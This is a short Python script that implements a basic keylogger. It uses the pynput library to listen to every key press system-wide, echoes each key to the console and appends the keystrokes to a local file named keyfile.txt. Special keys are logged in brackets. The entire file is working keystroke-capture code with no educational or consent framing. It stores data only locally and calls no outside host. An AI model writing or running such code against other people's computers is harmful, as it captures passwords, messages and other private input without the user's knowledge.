from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            if hasattr(key, 'char'):  # Check if the key has a 'char' attribute
                char = key.char
                if char == ' ':  # Check if the character is a space
                    logkey.write('\n')  # Write a newline character if it's a space
                else:
                    logkey.write(char)
            else:
                logkey.write(f'[{key}]')  # Write special keys as-is
        except Exception as e:
            print("Error getting char:", e)

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
